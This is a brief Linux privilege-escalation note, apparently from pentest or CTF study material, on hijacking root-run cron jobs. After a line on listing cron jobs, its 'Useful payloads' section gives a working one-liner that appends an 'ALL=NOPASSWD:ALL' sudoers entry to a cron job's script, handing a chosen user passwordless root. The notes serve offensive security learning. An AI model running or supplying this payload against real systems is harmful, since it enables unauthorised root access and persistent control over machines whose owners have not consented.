Task scheduling on Linux is done using Cron, a time-based service that runs applications or commands repeatedly on a specified schedule.
The crontab file is used to store and track Cron Jobs that have been created.

Cron Jobs can be run as any user on the system. If we can modify a Cron Job run by the root user, we can execute any command as root.

## Searching for Cron Jobs
+ `crontab -l` to list Cron Jobs for the current user
+ Otherwise, lots of enumeration are necessary

## Useful payloads
+ Add user to sudoers list :
	+ `echo 'echo "username ALL=NOPASSWD:ALL" >> /etc/sudoers' >> /path/to/cronjob/shellscript`
